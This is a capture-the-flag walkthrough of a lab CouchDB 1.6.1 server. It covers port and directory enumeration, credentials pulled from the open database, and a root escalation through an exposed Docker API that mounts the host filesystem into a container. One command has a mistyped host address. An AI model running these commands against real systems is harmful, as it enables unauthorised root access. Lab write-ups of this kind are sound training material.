# Couch

Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.

# Enumeration

`sudo nmap -sCV -T4 -p- 10.81.171.45`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Two ports are open: `ssh on port 22/tcp` and `CouchDB hosted on HTTP port 5984/tcp` with the database management system running on version 
1.6.1.

`gobuster dir -u http://10.81.171.45:5984/ -w /usr/share/wordlists/dirb/common.txt -s "200-299,300-302,401,403" -b "" -t 50 -x txt,json,html,db --timeout 10s`

```
/_config              (Status: 200) [Size: 4808]
/_log                 (Status: 200) [Size: 1000]
/_stats               (Status: 200) [Size: 4795]
/_utils               (Status: 301) [Size: 0] [--> http://10.81.171.45:5984/_utils/]
/_users               (Status: 200) [Size: 230]
/favicon.ico          (Status: 200) [Size: 9326]
```

## Initial Access

The path for the web administration tool for this database management system is at `http://10.81.171.45:5984/
And the endpoint that discloses all databases used in the db management system is `http://10.81.171.45:5984/_all_dbs` 

Found backup credentials for initial SSH access within the database. 

## Privilege Escalation 

Couldn't find anything when searching for exploitable binaries with set user permissions through `find / -perm u=s 2>/dev/null`
Dropped `linpeas.sh` on the target, some interesting information. 

- Netstat revealed some internal services running on ports 2375 and 44049
- Docker, the tool used for containerized applications, was running on the target. 

Checked the hidden `.bash_history` file to check for commands that the user had run previously: 
`docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine`

So... Here's the rundown for the privesc for this CTF:

With the help of GTFObins, I altered the above command: `docker -H 127.0.0.2375 run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`

- Connecting to the Docker API listening on localhost, TCP port 2375 and running the container; 
- Mounting the host's entire filesystem into `/mnt` inside the container. 
- Changing the root directory to `/mnt` which contains the entire filesystem of the host and running a shell with `/bin/sh`

> Because Docker runs as root, this mount is unrestricted, which allows full read/write permissions to every file on the host. 

- The `-it` and `--rm` flags are respectively just used to simply spawn an interactive shell and auto-delete the container after exiting.

Root flag obtained.
